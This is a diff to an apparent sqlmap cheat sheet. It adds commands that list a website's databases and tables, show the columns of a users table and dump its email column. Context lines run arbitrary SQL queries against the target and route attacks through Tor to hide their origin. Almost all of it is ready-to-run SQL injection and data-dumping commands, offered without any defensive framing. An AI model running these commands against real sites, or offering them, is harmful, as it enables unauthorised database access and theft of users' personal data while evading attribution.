@@ -24,3 +24,20 @@ sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
 
 # Use Tor Socks5 proxy
 sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs
+
+Simple database dump
+--------------------------------------------------------------------
+Example:
+// to show database available in website
+sqlmap -u https://mywebsite.com/php?id=1 --dbs 
+
+//to show tables
+sqlmap -u https://mywebsite.com/php?id=1 -D acuart --tables
+
+//to show table users with columns
+sqlmap -u https://mywebsite.com/php?id=1 -D acuart -T users --columns
+
+//to dump database
+sqlmap -u https://mywebsite.com/php?id=1 -D acuart -T users -C email --dump
+
+
